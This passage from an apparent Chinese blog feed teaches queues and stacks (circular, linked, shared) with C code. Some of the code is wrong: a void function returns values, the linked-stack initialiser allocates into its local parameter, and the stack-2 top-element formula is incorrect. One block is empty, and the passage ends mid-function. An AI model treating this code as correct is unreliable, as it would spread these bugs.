<p>　　3、类型中增设tag数据成员，则有：</p>
<p>　　<code>tag</code> 等于 0 的情况下，若因删除导致 <code>Q-&gt;front == Q-&gt;rear</code> 则为队空，<code>tag</code> 等于 1 的情况下，若因插入导致 <code>Q-&gt;front == Q-&gt;rear</code> 则为队满。</p>
<h5 id="基本操作实现"><a href="#基本操作实现" class="headerlink" title="基本操作实现"></a>基本操作实现</h5><p>　　下面例子采用第一种处理方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ElemType int</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></div><div class="line">    ElemType data[MAXSIZE];     <span class="comment">//存放数据元素的数组</span></div><div class="line">    <span class="keyword">int</span> front,rear;     <span class="comment">//头尾指针</span></div><div class="line">&#125;SeqQueue;</div><div class="line"></div><div class="line"><span class="comment">/*********初始化队列*********/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(SeqQueue *Q)</span></span>&#123;</div><div class="line">    Q-&gt;front = Q-&gt;rear = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*******判断队列是否为空*******/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueEmpty</span><span class="params">(SeqQueue *Q)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(Q-&gt;front == Q-&gt;rear)</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************入队操作*************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnQueue</span><span class="params">(SeqQueue *Q,ElemType e)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>((Q-&gt;rear+<span class="number">1</span>)%MAXSIZE == Q-&gt;front)     <span class="comment">//队满</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    Q-&gt;data[Q-&gt;rear] = e;   <span class="comment">//将e插入队尾</span></div><div class="line">    Q-&gt;rear = (Q-&gt;rear+<span class="number">1</span>)%MAXSIZE;  <span class="comment">//修改尾指针</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************出队操作**************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DeQueue</span><span class="params">(SeqQueue *Q,ElemType *e)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(Q-&gt;front == Q-&gt;rear)     <span class="comment">//队空</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    *e = Q-&gt;data[Q-&gt;front];     <span class="comment">//得到删除的队头元素</span></div><div class="line">    Q-&gt;front = (Q-&gt;front+<span class="number">1</span>)%MAXSIZE;    <span class="comment">//修改头指针</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************取队头元素**************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFront</span><span class="params">(SeqQueue *Q,ElemType *e)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(Q-&gt;front == Q-&gt;rear)   <span class="comment">//队空</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    *e = Q-&gt;data[Q-&gt;front];   <span class="comment">//取得队头元素</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    SeqQueue Q;</div><div class="line">    InitQueue(&amp;Q);</div><div class="line"></div><div class="line">    ....</div><div class="line"></div><div class="line">    进行入队、出队、判空等操作</div><div class="line">    ....</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="链式队列"><a href="#链式队列" class="headerlink" title="链式队列"></a>链式队列</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/8-3.jpg" alt="8-3"></p>
<p>　　采用链表形式的队列，队列中每个元素对应链表中的一个结点的，并设置两个分别指向队头和队尾的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ElemType int</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkQNode</span>&#123;</span></div><div class="line">    ElemType data;  <span class="comment">//数据域</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkQNode</span> *<span class="title">next</span>;</span>     <span class="comment">//指针域</span></div><div class="line">&#125;LinkQNode;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></div><div class="line">    LinkQNode *front;   <span class="comment">//队头指针</span></div><div class="line">    LinkQNode *rear;    <span class="comment">//队尾指针</span></div><div class="line">&#125;LinkQueue;</div><div class="line"></div><div class="line"><span class="comment">/*********初始化队列*********/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(LinkQueue *Q)</span></span>&#123;</div><div class="line">    LinkQNode *p = (LinkQNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkQNode));  <span class="comment">//构建头结点</span></div><div class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)    <span class="comment">//存储空间分配失败</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    Q-&gt;front = Q-&gt;rear = p;     <span class="comment">//队头指针和队尾指针都指向头结点</span></div><div class="line">    Q-&gt;front-&gt;next = <span class="literal">NULL</span>;   <span class="comment">//头结点指针域至为空</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*******判断队列是否为空*******/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueEmpty</span><span class="params">(LinkQueue *Q)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(Q-&gt;front == Q-&gt;rear)</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************入队操作*************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnQueue</span><span class="params">(LinkQueue *Q,ElemType e)</span></span>&#123;</div><div class="line">    LinkQNode *p = (LinkQNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkQNode));  <span class="comment">//构建新结点</span></div><div class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)    <span class="comment">//存储空间分配失败</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    p-&gt;data = e;    <span class="comment">//设置新结点数据域</span></div><div class="line">    p-&gt;next = <span class="literal">NULL</span>;     <span class="comment">//设置新结点指针域</span></div><div class="line">    Q-&gt;rear-&gt;next = p;  <span class="comment">//将新结点插入队尾</span></div><div class="line">    Q-&gt;rear = p;    <span class="comment">//修改队尾指针</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************出队操作**************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DeQueue</span><span class="params">(LinkQueue *Q,ElemType *e)</span></span>&#123;</div><div class="line">    LinkQNode *p;</div><div class="line">    <span class="keyword">if</span>(Q-&gt;front == Q-&gt;rear)     <span class="comment">//队列空</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    p = Q-&gt;front-&gt;next;     <span class="comment">//得到第一个结点</span></div><div class="line">    *e = p-&gt;data;   <span class="comment">//得到删除结点的值</span></div><div class="line">    Q-&gt;front-&gt;next = p-&gt;next;   <span class="comment">//结点p出队</span></div><div class="line">    <span class="keyword">if</span>(Q-&gt;rear == p)    <span class="comment">//队列中只有一个结点p，则出队后队列为空</span></div><div class="line">        Q-&gt;rear = Q-&gt;front;</div><div class="line">    <span class="built_in">free</span>(p);    <span class="comment">//释放存储空间</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************取队头元素**************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFront</span><span class="params">(LinkQueue *Q,ElemType *e)</span></span>&#123;</div><div class="line">    LinkQNode *p;</div><div class="line">    <span class="keyword">if</span>(Q-&gt;front == Q-&gt;rear)   <span class="comment">//队空</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    p = Q-&gt;front-&gt;next;     <span class="comment">//得到第一个结点</span></div><div class="line">    *e = p-&gt;data;   <span class="comment">//得到第一个结点的值</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    LinkQueue Q;</div><div class="line">    InitQueue(&amp;Q);</div><div class="line"></div><div class="line">    ....</div><div class="line"></div><div class="line">    进行入队、出队、判空等操作</div><div class="line">    ....</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/8-4.jpg" alt="8-4"></p>
<p>　　双端队列是指允许两端都可以进行入队和出队操作的队列。</p>
<p>　　输出受限的双端队列：允许在一端进行插入和删除，但在另一端只允许插入的双端队列。</p>
<p>　　输入受限的双端队列：允许在一端进行插入和删除，但在另一端只允许删除的双端队列。</p>
<p>　　尽管双端队列看起来似乎比栈和队列更灵活，但实际上在应用程序中远不及栈和队列有用，所以在这里就不详细的介绍啦！</p>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构基础之栈</title>
    <url>/2016/09/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%E4%B9%8B%E6%A0%88/</url>
    <content><![CDATA[<p>　　继续上一篇博客的话题，继续总结数据结构的相关知识，此篇博客主要总结栈的基本概念、存储结构、基本操作以及应用，栈是一种操作受限的线性表，只允许在表的一端进行插入和删除，也正因为它的这个特点，使得栈的应用十分广泛，比如数制转换、表达式求值等问题的解决都用到栈以及栈在递归中的重要作用。</p>
<a id="more"></a>
<h4 id="栈的基本概念"><a href="#栈的基本概念" class="headerlink" title="栈的基本概念"></a>栈的基本概念</h4><p>定义：只允许在表的一端进行插入和删除的操作的线性表。</p>
<p>栈顶：允许插入和删除的一端。</p>
<p>特点：后进先出（Last In First Out，LIFO）。</p>
<h4 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/7-1.jpg" alt="7-1"></p>
<p>对栈顶指针进行初始化时，可以将其初始化为-1，也可以初始化为0，当初始化为-1时栈顶指针指向的元素即为栈顶元素，而初始化为0时，栈顶指针减1所指向的元素才是栈顶元素，具体区别如下：</p>
<h5 id="初始化栈顶指针S-gt-top-1时"><a href="#初始化栈顶指针S-gt-top-1时" class="headerlink" title="初始化栈顶指针S-&gt;top = -1时"></a>初始化栈顶指针S-&gt;top = -1时</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
<h5 id="初始化栈顶指针S-gt-top-0时"><a href="#初始化栈顶指针S-gt-top-0时" class="headerlink" title="初始化栈顶指针S-&gt;top = 0时"></a>初始化栈顶指针S-&gt;top = 0时</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">栈顶元素为S-&gt;data[S-&gt;top - 1]</div><div class="line"></div><div class="line">进栈操作：先送值到栈顶元素，栈顶指针再加1，即S-&gt;data[S-&gt;top++] = x</div><div class="line"></div><div class="line">出栈操作：先将栈顶指针减1，再取栈顶元素值，即x = S-&gt;data[–S-&gt;top]</div><div class="line"></div><div class="line">栈空条件：S-&gt;top = 0</div><div class="line"></div><div class="line">栈满条件：S-&gt;top = MAXSIZE</div><div class="line"></div><div class="line">栈长：S-top</div></pre></td></tr></table></figure>
<h5 id="基本操作实现"><a href="#基本操作实现" class="headerlink" title="基本操作实现"></a>基本操作实现</h5><p>下面以将栈顶指针初始化为0为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ElemType int</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100     <span class="comment">//定义栈的最大容量</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></div><div class="line">    ElemType data[MAXSIZE];     <span class="comment">//存放栈中元素的数组</span></div><div class="line">    <span class="keyword">int</span> top;    <span class="comment">//栈顶指针</span></div><div class="line">&#125;SeqStack;</div><div class="line"></div><div class="line"><span class="comment">/******构造一个空栈******/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(SeqStack *S)</span></span></div><div class="line">&#123;</div><div class="line">    S-&gt;top = <span class="number">0</span>;    <span class="comment">//栈顶指针初始化为0</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*******判断栈空*******/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackEmpty</span><span class="params">(SeqStack *S)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(S-&gt;top == <span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/***********出栈操作***********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pop</span><span class="params">(SeqStack *S,ElemType *e)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(S-&gt;top == <span class="number">0</span>)    <span class="comment">//若栈空出栈失败</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    *e = S-&gt;data[-- S-&gt;top];    <span class="comment">//修改栈顶指针，并保存栈顶元素</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/***********进栈操作***********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Push</span><span class="params">(SeqStack *S,ElemType e)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(S-&gt;top == MAXSIZE)  <span class="comment">//若栈满则进栈失败</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    S-&gt;data[S-&gt;top ++] = e; <span class="comment">//将e插入栈顶，并修改栈顶指针</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/***********取栈顶元素***********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetTop</span><span class="params">(SeqStack *S,ElemType *e)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(S-&gt;top == <span class="number">0</span>)     <span class="comment">//若栈空取栈顶元素失败</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    *e = S-&gt;data[S-&gt;top<span class="number">-1</span>];     <span class="comment">//保存栈顶元素</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    SeqStack S;</div><div class="line">    InitStack(&amp;S);</div><div class="line"></div><div class="line">    ....</div><div class="line"></div><div class="line">    进行进栈、出栈、判断栈空等操作</div><div class="line">    ....</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h4><p>　　利用单链表结构来实现的栈，即栈中的每一个数据元素用一个结点来表示，同时设置一个指针top来指示栈顶元素的当前位置。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/7-2.jpg" alt="7-2"></p>
<h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul>
<li>便于多个栈共享存储空间</li>
<li>不存在栈满溢出的情况</li>
<li>操作与链表类似，便于结点的插入和删除</li>
</ul>
<h5 id="基本操作实现-1"><a href="#基本操作实现-1" class="headerlink" title="基本操作实现"></a>基本操作实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ElemType int</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SNode</span>&#123;</span></div><div class="line">    ElemType data;      <span class="comment">//数据域</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SNode</span> *<span class="title">next</span>;</span>     <span class="comment">//指针域</span></div><div class="line">&#125;SNode;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></div><div class="line">    SNode *top;     <span class="comment">//栈顶指针</span></div><div class="line">&#125;LinkStack;</div><div class="line"></div><div class="line"><span class="comment">/*******构造一个空栈*******/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitStack</span><span class="params">(LinkStack *S)</span></span>&#123;</div><div class="line">    S = (LinkStack *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkStack));     <span class="comment">//分配栈顶指针的内存空间</span></div><div class="line">    <span class="keyword">if</span>(S == <span class="literal">NULL</span>)   <span class="comment">//内存分配失败</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    S-&gt;top = <span class="literal">NULL</span>;  <span class="comment">//栈顶指针置为空</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**********置栈空**********/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearStack</span><span class="params">(LinkStack *S)</span></span></div><div class="line">&#123;</div><div class="line">    S-&gt;top = <span class="literal">NULL</span>;  <span class="comment">//将栈顶指针置为空</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*********判断栈空********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackEmpty</span><span class="params">(LinkStack *S)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> S-&gt;top == <span class="literal">NULL</span>;  <span class="comment">//判断栈顶指针是否为空</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/***********进栈操作***********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Push</span><span class="params">(LinkStack *S,ElemType e)</span></span>&#123;</div><div class="line">    SNode *temp;</div><div class="line">    temp = (SNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SNode));  <span class="comment">//生成新的结点</span></div><div class="line">    <span class="keyword">if</span>(temp == <span class="literal">NULL</span>)    <span class="comment">//内存分配失败</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    temp-&gt;data = e;     <span class="comment">//赋值给结点数据域</span></div><div class="line">    temp-&gt;next = S-&gt;top;    <span class="comment">//插入栈顶</span></div><div class="line">    S-&gt;top = temp;      <span class="comment">//修改栈顶指针</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/***********出栈操作***********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pop</span><span class="params">(LinkStack *S,ElemType *e)</span></span>&#123;</div><div class="line">    SNode *temp;</div><div class="line">    <span class="keyword">if</span>(S-&gt;top == <span class="literal">NULL</span>)  <span class="comment">//若栈为空则出栈失败</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    temp = S-&gt;top;</div><div class="line">    S-&gt;top = temp-&gt;next;    <span class="comment">//修改栈顶指针</span></div><div class="line">    *e = temp-&gt;data;    <span class="comment">//保存栈顶元素</span></div><div class="line">    <span class="built_in">free</span>(temp);     <span class="comment">//释放出栈结点</span></div><div class="line">    <span class="keyword">return</span>  <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/***********取栈顶元素***********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetTop</span><span class="params">(LinkStack *S,ElemType *e)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(S-&gt;top == <span class="literal">NULL</span>)  <span class="comment">//若栈为空则无法获取栈顶元素</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    *e = S-&gt;top-&gt;data;  <span class="comment">//取栈顶指针指向的元素</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    LinkStack S;</div><div class="line">    InitStack(&amp;S);</div><div class="line"></div><div class="line">    ....</div><div class="line"></div><div class="line">    进行进栈、出栈、判断栈空等操作</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="共享栈"><a href="#共享栈" class="headerlink" title="共享栈"></a>共享栈</h4><p>　　为了避免出现有的栈溢出有的栈空闲的情况，可以让多个栈共享一个足够大的数组空间，是存储空间得到充分利用。常见的是两栈共享空间，即让两个栈共享一个一维数组空间，使两个栈的栈底分别设置在共享空间的两端，两个栈顶向共享空间的中间延伸。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/7-3.jpg" alt="7-3"></p>
<h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h5><p>　　同样，由于初始化的不同会出现两种情况，这里以初始化栈1的栈顶指针为0，栈2的栈顶指针为MAXSIZE-1为例进行说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">栈满条件：S-&gt;top1 = S-&gt;top2 + 1</div><div class="line"></div><div class="line">栈空条件：S-&gt;top1 = 0 或 S-&gt;top2 = MAXSIZE - 1</div><div class="line"></div><div class="line">进栈操作：栈1：先赋值栈顶指针再加1，栈2：先赋值栈顶指针再减1</div><div class="line"></div><div class="line">出栈操作：栈1：栈顶指针先减1再赋值，栈2：栈顶指针先加1再赋值</div><div class="line"></div><div class="line">栈顶元素：栈1：S-&gt;data[S-&gt;top1-1]，栈2：S-&gt;data[S-&gt;top2-1]</div></pre></td></tr></table></figure>
<p>　　如果初始化栈1的栈顶指针为-1，栈2的栈顶指针为MAXSIZE会有什么不同呢？还是自己想一想吧，这里就不给出啦。</p>
<h5 id="基本操作实现-2"><a href="#基本操作实现-2" class="headerlink" title="基本操作实现"></a>基本操作实现</h5><p>　　下面是初始化为 0 和 MAXSIZE-1 的情况：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ElemType int</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100     <span class="comment">//定义栈的最大容量</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></div><div class="line">    ElemType data[MAXSIZE];     <span class="comment">//两栈共享的数组空间</span></div><div class="line">    <span class="keyword">int</span> top[<span class="number">2</span>];     <span class="comment">//两栈的栈顶指针</span></div><div class="line">&#125;DSeqStack;</div><div class="line"></div><div class="line"><span class="comment">/*********构造一个空栈*********/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(DSeqStack *S)</span></span></div><div class="line">&#123;</div><div class="line">    S-&gt;top[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//初始化栈1的栈顶指针</span></div><div class="line">    S-&gt;top[<span class="number">1</span>] = MAXSIZE<span class="number">-1</span>;  <span class="comment">//初始化栈2的栈顶指针</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*********判断栈是否为空*********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackEmpty</span><span class="params">(DSeqStack *S,<span class="keyword">int</span> i)</span></span>&#123;</div><div class="line">    <span class="keyword">switch</span>(i)&#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> (S-&gt;top[<span class="number">0</span>] == <span class="number">0</span>? <span class="literal">true</span>:<span class="literal">false</span>);    <span class="comment">//判断栈1是否为空</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">            <span class="keyword">return</span> (S-&gt;top[<span class="number">1</span>] == MAXSIZE<span class="number">-1</span>? <span class="literal">true</span>:<span class="literal">false</span>);    <span class="comment">//判断栈2是否为空</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">//参数错误</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**************进栈操作**************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Push</span><span class="params">(DSeqStack *S,ElemType e,<span class="keyword">int</span> i)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(S-&gt;top[<span class="number">0</span>] == S-&gt;top[<span class="number">1</span>]+<span class="number">1</span>)    <span class="comment">//判断栈空间是否满</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">switch</span>(i)&#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">            S-&gt;data[S-&gt;top[<span class="number">0</span>]] = e;     <span class="comment">//将e压入第1个栈</span></div><div class="line">            S-&gt;top[<span class="number">0</span>]++;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">            S-&gt;data[S-&gt;top[<span class="number">1</span>]] = e;     <span class="comment">//将e压入第2个栈</span></div><div class="line">            S-&gt;top[<span class="number">1</span>]--;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">//参数错误</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**************出栈操作**************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pop</span><span class="params">(DSeqStack *S,ElemType *e,<span class="keyword">int</span> i)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">switch</span>(i)&#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">            <span 